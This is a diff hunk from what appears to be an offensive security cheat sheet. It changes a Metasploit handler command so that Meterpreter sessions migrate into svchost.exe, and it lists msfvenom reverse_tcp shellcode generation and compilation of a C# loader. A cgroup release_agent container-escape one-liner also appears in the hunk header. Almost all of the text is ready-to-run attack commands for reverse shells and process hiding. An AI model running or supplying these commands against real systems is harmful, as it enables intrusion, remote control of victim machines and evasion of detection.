@@ -1256,7 +1256,7 @@ d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`;mkdir -p $d/w;echo 1 >$d/w/notify_
 ## Windows
 [*] Initial Shell
 [###] Meterpreter: Reflected in Memory Using Shellcode
-msfconsole -q -x 'use exploit/multi/handler; setg SRVPORT 8888; setg LHOST $MYIP; setg LPORT 443; set TARGET 0; setg PAYLOAD windows/x64/meterpreter/reverse_tcp; set ExitOnSession false; run -j'
+msfconsole -q -x 'use exploit/multi/handler; setg AutoRunScript post/windows/manage/migrate KILL=false NAME=svchost.exe SPAWN=false; setg ExitOnSession false; setg SRVPORT 8888; setg LHOST $MYIP; setg LPORT 443; set TARGET 0; setg PAYLOAD windows/x64/meterpreter/reverse_tcp; run -j'
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$MYIP LPORT=443 -f csharp
 nano /Upload/windows/connect.cs   # edit IP/PORT/SHELLCODE
 mcs /Upload/windows/connect.cs
